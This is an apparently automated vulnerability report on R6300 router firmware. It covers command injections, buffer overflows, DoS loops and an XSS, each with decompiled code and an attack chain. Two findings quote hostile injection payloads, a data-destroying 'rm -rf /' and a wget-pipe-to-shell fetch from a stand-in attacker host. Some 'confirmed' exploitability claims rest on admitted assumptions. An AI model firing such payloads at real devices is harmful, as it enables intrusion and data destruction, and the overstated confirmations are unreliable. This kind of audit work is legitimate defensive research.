# R6300 (15 个发现)

---

### CommandInjection-bftpd-fcn.0000c224

- **文件/目录路径：** `usr/sbin/bftpd`
- **位置：** `bftpd:0xc338 in function fcn.0000c224`
- **风险评分：** 9.0
- **置信度：** 9.0
- **描述：** A command injection vulnerability exists in the bftpd FTP server where user-controlled input from FTP commands is passed directly to the execv function without proper sanitization or validation. This vulnerability allows an authenticated non-root user to execute arbitrary commands on the system by crafting malicious inputs in FTP commands that trigger the vulnerable code path. The attack chain involves: user input obtained in function fcn.0000d95c, propagated through fcn.0000d1e8 to fcn.0000c224, and executed via execv at address 0xc338. Trigger conditions include sending specific FTP commands that leverage this path, such as those involving command execution or script handling. The vulnerability lacks input validation, enabling attackers to inject and execute shell commands, potentially leading to privilege escalation or full system compromise. Technical details include the use of execv with parameters derived from user input, demonstrating a clear lack of boundary checks or filtering.
- **代码片段：**
  ```
  From decompilation of fcn.0000c224 at address 0xc338:
  sym.imp.execv(param_1, puVar7 + -0x10)
  Where param_1 and puVar7 + -0x10 are derived from user input without validation, allowing command injection if user-controlled data is passed.
  ```
- **关键词：** fcn.0000d95c, fcn.0000d1e8, fcn.0000c224, execv
- **备注：** This vulnerability was identified in a general command execution path and may affect various FTP commands, though the specific handler for SITE CHMOD was not directly linked. The attack chain is complete and verifiable within the analyzed functions. Further investigation could map exact FTP commands that trigger this path, but the exploitability is confirmed. Additional components like NVRAM or environment variables were not involved in this chain.

---
### 命令注入和缓冲区溢出-fcn.0001a2b4

- **文件/目录路径：** `sbin/acos_service`
- **位置：** `acos_service:0x0001a4d4 fcn.0001a2b4`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 命令注入和缓冲区溢出漏洞存在于函数 fcn.0001a2b4 中。用户控制的命令行参数通过 sprintf 格式化到固定大小栈缓冲区（0x108 字节），格式为 'ifconfig %s add %s/%s'，然后通过 system 执行。缺少边界检查和输入过滤。触发条件：argc > 3 且特定 NVRAM 配置（如 'dhcp6c_readylogo' 设置为 '1'）满足。约束条件：输入直接插入命令字符串。潜在攻击：攻击者注入命令（如 '; rm -rf /'）或导致缓冲区溢出，执行任意代码。
- **代码片段：**
  ```
  // 从汇编代码提取
  0x0001a4d4: bl sym.imp.sprintf // 使用格式字符串 'ifconfig %s add %s/%s'
  0x0001a4e8: bl sym.imp.system // 执行命令，可能注入或溢出
  ```
- **关键词：** 命令行参数: argv, NVRAM 变量: dhcp6c_readylogo, dhcp6c_iana_only, ipv6_proto, 系统调用: system, sprintf, 自定义函数符号: fcn.0001a2b4, sym.imp.sprintf, sym.imp.system
- **备注：** 攻击链完整：从 main 函数传递命令行参数到 fcn.0001a2b4，最终通过 system 执行。污点数据流已验证。建议检查实际设备上的调用机制。

---
### 命令注入-fcn.0001a53c

- **文件/目录路径：** `sbin/acos_service`
- **位置：** `acos_service:0x0001a53c fcn.0001a53c 和 0x0001a064 fcn.0001a064`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 命令注入漏洞存在于函数 fcn.0001a53c 中。用户控制的命令行参数通过 sprintf 构建命令字符串（格式为 'ifconfig %s del %s/%s'），然后通过 system 执行，缺少输入验证。触发条件：argc > 1 且 NVRAM 配置（如 'ipv6_proto' 匹配 'autoconfig'）满足。约束条件：无输入过滤或转义。潜在攻击：攻击者注入恶意命令（如 '`wget http://attacker.com/shell.sh -O - | sh`'），导致任意代码执行。
- **代码片段：**
  ```
  // 从污点分析提取
  0x0001a248: bl sym.imp.sprintf // 构造命令字符串 'ifconfig %s del %s/%s'
  0x0001a250: bl sym.imp.system // 执行命令，用户输入被注入
  ```
- **关键词：** 命令行参数: argv, NVRAM 变量: ipv6_proto, autoconfig, pppoe, auto, dhcp, 系统调用: system, sprintf, 自定义函数符号: fcn.0001a53c, fcn.0001a064, sym.imp.acosNvramConfig_match, sym.imp.sprintf, sym.imp.system
- **备注：** 攻击链完整：命令行参数通过 sprintf 和 system 执行。污点数据流从输入点到汇聚点已追踪。建议验证 NVRAM 变量的可控制性。

---
### Command-Injection-hotplug2-event-handler

- **文件/目录路径：** `sbin/hotplug2`
- **位置：** `sbin/hotplug2:0xa8d0 fcn.0000a8d0 (switch cases 0 and 1)`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 在 hotplug2 的事件处理机制中，当处理热插拔事件时，不可信的输入数据（来自 param_2，包含设备属性或操作）通过 fcn.0000a73c 函数处理。该函数仅检查多个 '%' 字符，但未清理 shell 元字符（如 ;, &, |, `, $）。这种缺乏清理允许经过身份验证的非 root 用户通过精心制作的事件数据注入任意命令。漏洞在 fcn.0000a8d0 的 switch cases 0（system 调用）和 1（execvp 调用）中触发。攻击者可以通过影响热插拔事件（例如，插入带有恶意属性的 USB 设备）来利用此漏洞，导致命令以提升的权限执行（如果 hotplug2 以 root 身份运行）。攻击链从输入源（param_2）到汇点（system()/execvp()）完整，中间没有适当的边界检查或验证。
- **代码片段：**
  ```
  相关代码片段来自 fcn.0000a8d0：
    - Case 0 (system call):
      case 0:
          uVar5 = sym.imp.strdup(**(iVar12 + 4));  // 从 param_2 加载不可信字符串
          uVar9 = fcn.0000a73c(uVar5, param_1);    // 处理字符串（无 shell 元字符清理）
          iVar11 = sym.imp.system(uVar9);          // 直接命令执行 - 漏洞点
          // ... 其他代码
    - Case 1 (execvp call):
      case 1:
          piVar6 = *(iVar12 + 4);                  // 从 param_2 加载不可信字符串数组
          iVar11 = *piVar6;
          uVar13 = sym.imp.fork();
          if (uVar13 != 0xffffffff) {
              piVar10 = piVar6;
              if (uVar13 == 0) {
                  while( true ) {
                      iVar8 = *piVar10;
                      if (iVar8 == 0) break;
                      iVar8 = fcn.0000a73c(iVar8, param_1);  // 处理每个字符串（无清理）
                      *piVar10 = iVar8;            // 用处理后的数据覆盖
                      piVar10 = piVar10 + 1;
                  }
                  sym.imp.execvp(iVar11, piVar6);  // 执行命令和参数 - 漏洞点
                  sym.imp.exit(iVar8);
              }
          }
          break;
    - fcn.0000a73c 中的代码显示缺乏清理：
      while( true ) {
          iVar3 = sym.imp.strchr(param_1, 0x25);  // 检查 '%'
          if (iVar3 + 0 == 0) break;
          param_1 = iVar3 + 0 + 1;
          iVar2 = sym.imp.strchr(param_1, 0x25);
          if (iVar2 != 0) {
              fcn.0000a30c((iVar2 - iVar3) + 2);  // 仅处理多个 '%'，无 shell 元字符检查
          }
      }
  ```
- **关键词：** hotplug event data (via param_2), environment variables set via setenv in fcn.0000a8d0, fcn.0000a73c (string processing function), fcn.000091c0 (value retrieval function), /etc/hotplug2.rules (配置文件), netlink socket (IPC 通信)
- **备注：** 此发现基于对 sbin 目录中 hotplug2 二进制文件的分析。攻击链假设 param_2 从用户影响的热插拔事件（例如，通过 udev 规则或设备属性）填充。进一步分析可追踪 param_2 如何从外部输入（如内核事件或配置文件）初始化。漏洞可由经过身份验证的非 root 用户利用，通过触发或影响热插拔事件，可能导致权限提升。相关函数包括 fcn.00009930（调用者）、fcn.0000a73c（字符串处理器）和 fcn.000091c0（值检索器）。建议验证热插拔事件数据流以确认输入来源。

---
### BufferOverflow-emf_netlink_sock_cb

- **文件/目录路径：** `lib/modules/2.6.36.4brcmarm+/kernel/drivers/net/emf/emf.ko`
- **位置：** `emf.ko:0x08002930 (sym.emf_netlink_sock_cb) -> emf.ko:0x080022d8 (reloc.emf_cfg_request_process) -> emf.ko:0x08002660 (sprintf call)`
- **风险评分：** 8.5
- **置信度：** 9.0
- **描述：** 该函数处理 netlink 消息时，在消息长度 >= 1056 字节且接口名称验证失败时，会调用 `sprintf` 而没有边界检查，导致栈缓冲区溢出。攻击者作为非 root 用户但拥有有效登录凭据，可以通过网络接口（netlink 套接字）发送特制消息触发此漏洞。完整攻击链：输入点（netlink 套接字）→ 数据流（netlink 消息处理，通过 `sym.emf_netlink_sock_cb` 和 `reloc.emf_cfg_request_process`）→ 缺少验证（`sym.emf_if_name_validate` 返回 0 时未检查缓冲区边界）→ 危险操作（`sprintf` 调用导致溢出）。触发条件包括：消息长度至少 1056 字节、接口名称无效。可利用性分析：攻击者可能覆盖相邻内存，实现任意代码执行或拒绝服务。
- **代码片段：**
  ```
  在 sym.emf_netlink_sock_cb 中：
  0x08002930: push {r4, r5, r6, lr}
  0x08002934: mov r1, 0xd0
  0x08002938: bl reloc.skb_clone
  0x0800293c: mov r5, r0
  0x08002940: ldr r3, [r0, 0x94]
  0x08002944: cmp r3, 0x420
  0x08002948: blo 0x800298c  ; 如果长度 < 1056 则跳转
  0x0800294c: ldr r4, [r0, 0xd8]  ; 加载消息数据指针
  0x08002950: add r0, r4, 0x10
  0x08002954: bl reloc.emf_cfg_request_process
  在 emf_cfg_request_process 的漏洞路径中：
  0x080022e8: bl sym.emf_if_name_validate
  0x080022ec: subs r5, r0, 0
  0x080022f0: beq 0x8002654  ; 如果验证失败则分支
  0x08002654: mov r3, 2
  0x08002658: add r0, r4, 0x20  ; 缓冲区在 r4 + 0x20
  0x0800265c: str r3, [r4, 0x18]
  0x08002660: mov r2, r4  ; 污染数据作为参数
  0x08002664: ldr r1, [0x080028f4]  ; 格式字符串地址
  0x08002668: bl sprintf  ; 无边界检查的危险调用
  ```
- **关键词：** netlink_socket, sym.emf_netlink_sock_cb, reloc.emf_cfg_request_process, sym.emf_if_name_validate, sprintf
- **备注：** 此漏洞假设 netlink 套接字可被非 root 用户访问（基于攻击者拥有有效登录凭据）。格式字符串在 [0x080028f4] 可能不是用户控制的，但缓冲区溢出仍可利用。建议进一步验证 netlink 套接字的权限和具体影响，例如通过动态测试确认代码执行可能性。关联文件包括 netlink 相关内核代码。

---
### 命令注入-burnboardid

- **文件/目录路径：** `sbin/acos_service`
- **位置：** `acos_service:0x00013fa0 fcn.000154d0`
- **风险评分：** 8.5
- **置信度：** 8.5
- **描述：** 命令注入漏洞存在于函数 fcn.000154d0 (burnboardid) 中。用户控制的输入（通过环境变量或 NVRAM 变量）被用于构建 system 命令，缺少输入验证和过滤。攻击者可以注入恶意命令（如 '; malicious_command'）来执行任意代码。触发条件：攻击者设置恶意环境变量或操纵 NVRAM 值。约束条件：输入直接插入命令字符串，无边界检查或转义。潜在攻击：攻击者作为认证用户通过 Web 接口或 API 设置输入，导致远程代码执行。
- **代码片段：**
  ```
  // 从反编译代码提取的示例
  uVar13 = sym.imp.acosNvramConfig_get(uVar13, uVar17);
  sym.imp.sprintf(iVar18, *0x140e0, pcVar10, uVar13); // pcVar10 和 uVar13 为用户输入
  sym.imp.system(iVar18); // 执行命令，可能注入恶意代码
  ```
- **关键词：** 环境变量: 通过 getenv 获取的变量, NVRAM 变量: 通过 acosNvramConfig_get 获取的配置, IPC/网络输入: 可能通过 HTTP 请求设置环境变量, 自定义函数符号: fcn.000154d0, acosNvramConfig_get, getenv, sprintf, system
- **备注：** 证据基于反编译代码中的多个 system 调用链。攻击链完整：从 getenv 或 acosNvramConfig_get 到 system。建议验证具体环境变量名和 NVRAM 变量的可控制性。

---
### 无标题的发现

- **文件/目录路径：** `usr/sbin/nvram`
- **位置：** `nvram:0x00008808 fcn.00008808`
- **风险评分：** 8.5
- **置信度：** 8.0
- **描述：** 在 'nvram' 程序中，当处理 'version' 命令时，程序从 NVRAM 获取变量（如 'pmon_ver' 和 'os_version'）并使用 strcat 和 memcpy 将它们连接到一个固定大小的堆栈缓冲区（0x10000 字节）。由于没有边界检查，攻击者可以通过设置这些 NVRAM 变量为长字符串（总长度超过 0x10000 字节）导致缓冲区溢出。溢出可能覆盖堆栈上的返回地址，允许任意代码执行。触发条件：攻击者作为非 root 用户设置恶意 NVRAM 变量后执行 'nvram version' 命令。潜在利用方式：精心构造的字符串可覆盖返回地址，跳转到 shellcode 或现有代码片段，可能提升权限（如果 nvram 程序以较高权限运行）。
- **代码片段：**
  ```
  // 关键代码片段从反编译中提取
  puVar16 = iVar17 + -0x10000 + -4; // 缓冲区指针
  sym.imp.memset(puVar16, 0, 0x10000); // 初始化缓冲区
  // ...
  iVar1 = sym.imp.nvram_get(iVar8 + *0x8c14); // 获取 'pmon_ver'
  if (iVar1 == 0) { iVar1 = iVar8 + *0x8c28; }
  sym.imp.strcat(puVar16, iVar1); // 可能溢出点
  // ...
  iVar1 = sym.imp.nvram_get(iVar8 + *0x8c20); // 获取 'os_version'
  if (iVar1 == 0) { iVar1 = iVar8 + *0x8c28; }
  sym.imp.strcat(puVar16, iVar1); // 另一个可能溢出点
  ```
- **关键词：** NVRAM:pmon_ver, NVRAM:os_version, file:/sbin/nvram
- **备注：** 漏洞需要攻击者能设置 NVRAM 变量并执行 nvram 命令。假设 nvram 程序可能以 root 权限运行（常见于固件），但需进一步验证文件权限和实际环境。建议检查 nvram 的 setuid 位和测试利用链。关联函数：fcn.00008808（主逻辑）、nvram_get、strcat。

---
### 无标题的发现

- **文件/目录路径：** `usr/lib/libupnp.so`
- **位置：** `libupnp.so:0x00006a94 sym.upnp_tlv_convert (case 8)`
- **风险评分：** 8.5
- **置信度：** 7.5
- **描述：** An integer overflow vulnerability exists in the TLV data processing of UPnP library, specifically in base64 decoding. When handling a SOAP request with a very long base64 string (approaching 4GB in length), the `strlen` function returns a large value, and `iVar4 + 8` in `sym.upnp_tlv_convert` case 8 integer overflows, leading to a small buffer allocation (e.g., 7 bytes for `iVar4=0xFFFFFFFF`). Subsequently, `sym.upnp_base64_decode` writes the decoded data (which can be up to 3GB) into this small buffer, causing a heap buffer overflow. An attacker with network access and valid login credentials (non-root user) can craft a malicious SOAP request to trigger this overflow, potentially leading to remote code execution or privilege escalation if the UPnP service runs as root. The trigger condition is sending a SOAP request with an excessively long base64-encoded TLV field.
- **代码片段：**
  ```
  case 8:
      iVar4 = loc.imp.strlen(param_2);
      if (param_1[2] != 0) {
          loc.imp.free();
      }
      piVar1 = loc.imp.malloc(iVar4 + 8);
      bVar9 = piVar1 == NULL;
      piVar3 = piVar1;
      param_1[2] = piVar1;
      if (bVar9) {
          piVar1 = 0x25b;
      }
      if (!bVar9) {
          piVar1 = rsym.upnp_base64_decode(param_2,iVar4,piVar3);
          bVar9 = piVar1 + 0 < 0;
          bVar10 = piVar1 != NULL;
          param_1[1] = piVar1;
          if (!bVar10 || bVar9) {
              piVar1 = 0x258;
          }
          if (bVar10 && !bVar9) {
              piVar1 = NULL;
          }
          return piVar1;
      }
      return piVar1;
  ```
- **关键词：** SOAP request data, TLV data in UPnP actions, base64-encoded input in SOAP body
- **备注：** The vulnerability requires a large input (~4GB) to trigger the integer overflow, which may be impractical in some environments due to network constraints, but in local networks or with resourceful attackers, it could be feasible. The exploitability depends on the heap layout and mitigation techniques (e.g., ASLR). Further analysis is recommended to verify the exact impact and develop a working exploit. The functions `sym.soap_process` and `sym.action_process` are involved in the data flow from SOAP input to this point.

---
### BufferOverflow-SendEmail

- **文件/目录路径：** `usr/lib/libnat.so`
- **位置：** `libnat.so:0x0000e42c SendEmail (strcat call)`
- **风险评分：** 8.0
- **置信度：** 8.0
- **描述：** The SendEmail function contains a stack buffer overflow vulnerability when processing the SMTP server address (param_2). A fixed-size 1024-byte stack buffer is initialized with 'HELO ' (5 bytes), and strcat is used to append param_2 without length validation. If param_2 exceeds 1019 bytes, it overflows the buffer. The return address is located 1068 bytes from the buffer start, allowing arbitrary code execution by crafting a long param_2. Attackers with valid login credentials can exploit this by setting a malicious SMTP server address in device configuration (e.g., via web interface or NVRAM), triggering the overflow when SendEmail is called during email alert operations. The vulnerability is directly exploitable under the non-root user context, leading to potential full control of the process.
- **代码片段：**
  ```
  From decompilation:
  *puVar3 = **(puVar7 + -0x830);
  *(puVar7 + -0x820) = uVar6;
  loc.imp.strcat(puVar3,param_2);
  
  From disassembly:
  0x0000e428      0510a0e1       mov r1, r5  ; r5 is param_2
  0x0000e42c      0fd4ffeb       bl loc.imp.strcat
  ```
- **关键词：** param_2 (SMTP server address), NVRAM variables for email configuration, acosFw_SetEmailConfig
- **备注：** The input param_2 is assumed to be user-controllable via device configuration, but the data flow from untrusted sources (e.g., network interfaces or NVRAM) was not verified within this analysis due to scope restrictions. Further tracing of calls to SendEmail and configuration functions (e.g., acosFw_SetEmailConfig) is recommended to confirm the complete attack chain. This vulnerability is considered highly exploitable based on the code evidence.

---
### DoS-opendns_hijack_functions

- **文件/目录路径：** `lib/modules/2.6.36.4brcmarm+/kernel/lib/opendns.ko`
- **位置：** `opendns.ko:0x08000528 (sym.openDNS_Hijack_pre_input), opendns.ko:0x08000480 (sym.openDNS_Hijack_post_input)`
- **风险评分：** 7.5
- **置信度：** 9.0
- **描述：** The 'opendns.ko' kernel module contains a denial-of-service vulnerability in its network packet hook functions. Specifically, `openDNS_Hijack_pre_input` and `openDNS_Hijack_post_input` functions enter an infinite loop when processing IPv4 packets with a source or destination port of 53 (DNS). This occurs when the IP version field is 4 (IPv4) and the port field matches 0x35 (53 in decimal). The infinite loop causes the kernel to hang or crash, leading to a system-wide DoS. A non-root user with network access can exploit this by sending crafted IPv4 DNS packets to the device, triggering the loop without any authentication or special privileges. The vulnerability is directly exploitable and requires no additional steps beyond sending the malicious packets.
- **代码片段：**
  ```
  // From sym.openDNS_Hijack_pre_input
  if ((*param_3 >> 4 == 4) && (CONCAT11(param_3[0x16],param_3[0x17]) == 0x35)) {
      do {
          // Infinite loop
      } while( true );
  }
  
  // From sym.openDNS_Hijack_post_input
  if ((*param_3 >> 4 == 4) && (CONCAT11(param_3[0x14],param_3[0x15]) == 0x35)) {
      do {
          // Infinite loop
      } while( true );
  }
  ```
- **关键词：** sym.openDNS_Hijack_pre_input, sym.openDNS_Hijack_post_input, network interface
- **备注：** The vulnerability is straightforward and exploitable by any user with network access. No privilege escalation is involved, but the DoS impact is severe. Further analysis could involve testing the module in a live environment to confirm the trigger conditions. The module initialization also has an infinite loop, but it is likely a development error and not directly exploitable at runtime.

---
### 缓冲区溢出-burnethermac

- **文件/目录路径：** `sbin/acos_service`
- **位置：** `acos_service:0x15c44 fcn.00015c44`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 缓冲区溢出漏洞存在于函数 fcn.00015c44 (burnethermac) 中。用户控制的環境变量（如 IFNAME、IDLE_TIMEOUT）通过 strcat 连接到栈缓冲区（如 auStack_b0，80 字节），缺少边界检查。攻击者可以提供超长值覆盖栈数据，包括返回地址，导致任意代码执行。触发条件：函数被调用时环境变量值过长。约束条件：缓冲区大小固定，无长度验证。潜在攻击：攻击者设置恶意环境变量，溢出缓冲区并控制执行流。
- **代码片段：**
  ```
  // 示例代码显示 strcat 使用
  puVar6 = puVar9 + -0x44; // 栈缓冲区
  sym.imp.strcat(puVar6, iVar8); // iVar8 来自 getenv，无边界检查
  sym.imp.unlink(puVar6); // 可能路径遍历如果缓冲区溢出
  ```
- **关键词：** 环境变量: IFNAME, IDLE_TIMEOUT, NVRAM 变量: acosNvramConfig_set, acosNvramConfig_match, 文件操作: unlink, fopen, 自定义函数符号: fcn.00015c44, strcat, getenv
- **备注：** 漏洞基于反编译代码中的多个 strcat 操作。攻击链完整：环境变量输入到缓冲区溢出。需要进一步追踪函数调用上下文以确认非 root 用户可访问性。

---
### stack-buffer-overflow-vol_id

- **文件/目录路径：** `lib/udev/vol_id`
- **位置：** `vol_id:0x9654 sym.imp.sprintf`
- **风险评分：** 7.5
- **置信度：** 8.0
- **描述：** 在 'vol_id' 程序中发现栈缓冲区溢出漏洞。漏洞位于处理卷标导出功能的代码路径中，当程序以 '--export' 模式运行时，会使用 `sprintf` 将用户控制的卷标写入固定大小的栈缓冲区。攻击者可以通过创建特制设备文件（如 USB 存储设备）并设置恶意卷标来触发溢出。具体触发条件：1) 程序以 '--export' 模式运行；2) 设备文件路径包含 'sd' 字符串（表示 USB 设备）；3) 卷标长度超过目标缓冲区大小（348 字节）。利用方式：攻击者作为已登录非 root 用户，可以创建特制设备文件或挂载恶意存储设备，然后运行 'vol_id --export /dev/sdX' 来触发溢出，可能执行任意代码或导致拒绝服务。
- **代码片段：**
  ```
  0x0000964c      80119fe5       ldr r1, str._tmp_usb_vol_name__s ; [0xa4ea:4]=0x706d742f ; "/tmp/usb_vol_name/%s"
  0x00009650      0500a0e1       mov r0, r5                  ; char *s
  0x00009654      22feffeb       bl sym.imp.sprintf          ; int sprintf(char *s, const char *format, ...)
  ```
- **关键词：** ID_FS_LABEL, /tmp/usb_vol_name/%s
- **备注：** 漏洞已验证：1) 目标缓冲区在栈上，大小固定（348 字节）；2) 卷标完全用户控制，通过设备文件提供；3) 无边界检查，直接使用 `sprintf`。攻击链完整：非 root 用户可创建特制设备文件 → 运行 vol_id → 触发溢出。建议进一步验证实际利用可行性，例如检查栈布局和覆盖返回地址的可能性。

---
### buffer-overflow-igs_cfg_request_process

- **文件/目录路径：** `lib/modules/2.6.36.4brcmarm+/kernel/drivers/net/igs/igs.ko`
- **位置：** `igs.ko:0x08001f20 sym.igs_cfg_request_process (multiple addresses: 0x08002010, 0x08002040, 0x08002060, etc.)`
- **风险评分：** 7.5
- **置信度：** 7.0
- **描述：** A buffer overflow vulnerability exists in the 'sym.igs_cfg_request_process' function of the 'igs.ko' kernel module. The vulnerability occurs in error handling paths where 'sprintf' is used to format user-controlled input into a buffer without bounds checks. Specifically, 'sprintf' is called with the destination buffer at offset 0x20 from the input pointer (r4), and the format string contains '%s' or similar specifiers, allowing attacker-controlled data from the input buffer to be written. The input is received via Netlink socket callback ('sym.igs_netlink_sock_cb'), and the error paths are triggered when conditions like invalid instance identifiers or command IDs are encountered. An attacker with access to the Netlink socket (e.g., a logged-in user) can craft a message with a long string in relevant fields (e.g., instance identifier), causing 'sprintf' to write beyond the allocated buffer size. This could corrupt adjacent kernel memory, leading to denial of service or potential code execution. The vulnerability is exploitable when the error path is triggered, and the input buffer is sufficiently large (at least 1056 bytes as checked in 'sym.igs_netlink_sock_cb').
- **代码片段：**
  ```
  Example code from disassembly:
  0x08002010: ldr r1, [0x080020dc]  // Load format string (e.g., with %s)
  0x08002014: bl sprintf             // sprintf(r4+0x20, format, r4)
  Where r4 is the user-controlled input buffer.
  ```
- **关键词：** Netlink socket for IGS family, igs_netlink_sock_cb, igs_cfg_request_process
- **备注：** The vulnerability is in error paths, which may be less frequently executed, but are reachable via Netlink messages. The exact format strings and buffer sizes are not fully verified from the binary, but the use of 'sprintf' with user input is evident. Further analysis could involve dynamic testing or examining the kernel module's interaction with other components. Additional functions like 'sym.igsc_cfg_request_process' should be checked for similar issues.

---
### DoS-sym.ubd_netlink_sock_cb

- **文件/目录路径：** `lib/modules/2.6.36.4brcmarm+/kernel/lib/ubd.ko`
- **位置：** `ubd.ko:0x08000994 sym.ubd_netlink_sock_cb`
- **风险评分：** 7.0
- **置信度：** 8.0
- **描述：** 在函数 sym.ubd_netlink_sock_cb 中，缺少对 Netlink 消息长度的充分验证。具体问题：函数访问参数 param_1（Netlink 消息结构指针）偏移 0x94 处的值，如果该值大于 1055（0x41f），则进入无限循环，导致内核线程挂起和系统拒绝服务。触发条件：攻击者构造 Netlink 消息，其中消息结构偏移 0x94 处的字段值超过 1055。约束条件：攻击者需能发送 Netlink 消息到该回调函数；非 root 用户可能需 CAP_NET_ADMIN 权限，但模块可能放宽此限制。潜在攻击方式：攻击者作为已登录用户编写恶意用户空间程序，通过 Netlink 套接字发送特制消息，耗尽系统资源。利用概率高，因代码直接进行长度比较后进入循环，缺少错误恢复。
- **代码片段：**
  ```
  void sym.ubd_netlink_sock_cb(int32_t param_1) {
      // ... 代码简化 ...
      if (0x41f < *(param_1 + 0x94)) {
          do {
              // 无限循环
          } while( true );
      }
      return;
  }
  ```
- **关键词：** Netlink 套接字, 函数 sym.ubd_netlink_sock_cb
- **备注：** 反编译代码有警告，但逻辑清晰；需要验证 Netlink 套接字创建时的权限设置（如是否允许非 root 用户访问）。关联函数：hasExclusiveAccess（同步机制）。建议后续分析模块初始化（sym.ubd_module_init）以确认 Netlink 套接字绑定和权限。

---
### XSS-displayItems-jquery-flexbox

- **文件/目录路径：** `www/script/jquery.flexbox.min.js`
- **位置：** `jquery.flexbox.min.js:displayItems 函数（约行 400-450）`
- **风险评分：** 5.0
- **置信度：** 8.0
- **描述：** 在 jquery.flexbox.min.js 中，displayItems 函数使用 .html() 方法直接插入未转义的 HTML 内容，导致潜在的跨站脚本攻击（XSS）。具体问题包括：1) 通过 o.resultTemplate.applyTemplate(data) 生成的结果字符串可能包含恶意 HTML 或脚本；2) 在 highlightMatches 过程中，用户输入 q 用于正则表达式替换，但最终内容通过 .html() 渲染，缺乏输出编码；3) 如果数据源（如远程 API 或客户端对象）返回不可信数据，攻击者可注入恶意代码，在用户浏览器中执行。触发条件包括：数据源被污染、o.resultTemplate 包含未过滤的 HTML、或 o.highlightMatches 为 true 时用户输入包含特殊字符。潜在攻击方式：攻击者作为认证用户，通过修改请求或响应注入脚本，实现会话劫持或恶意操作。约束条件：漏洞依赖数据源的可控性，在固件中可能受限于内部 API 的安全性。
- **代码片段：**
  ```
  for (var i = 0; i < d[o.resultsProperty].length; i++) {
      var data = d[o.resultsProperty][i],
      result = o.resultTemplate.applyTemplate(data),
      exactMatch = q === result,
      selectedMatch = false,
      hasHtmlTags = false,
      match = data[o.displayValue];
      if (!exactMatch && o.highlightMatches && q !== '') {
          var pattern = q,
          highlightStart = match.toLowerCase().indexOf(q.toLowerCase()),
          replaceString = '<span class="' + o.matchClass + '">' + match.substr(highlightStart,q.length) + '</span>';
          if (result.match('<(.|\n)*?>')) {
              hasHtmlTags = true;
              pattern = '(>)([^<]*?)(' + q + ')((.|\n)*?)(<)';
              replaceString = '$1$2<span class="' + o.matchClass + '">$3</span>$4$6';
          }
          result = result.replace(new RegExp(pattern, o.highlightMatchesRegExModifier), replaceString);
      }
      $row = $('<div></div>')
          .attr('id', data[o.hiddenValue])
          .attr('val', data[o.displayValue])
          .addClass('row')
          .html(result)
          .appendTo($content);
  }
  ```
- **关键词：** o.source, data[o.displayValue], o.resultTemplate, q, o.highlightMatches
- **备注：** 漏洞存在明确的代码证据，但完整攻击链需要控制数据源（如 o.source 或数据对象），在固件上下文中可能难以验证。建议后续分析检查使用此插件的 HTML 页面和数据源 API。其他函数如 displayItems2 有类似问题。未发现与 NVRAM、IPC 或系统级交互相关的漏洞。

---
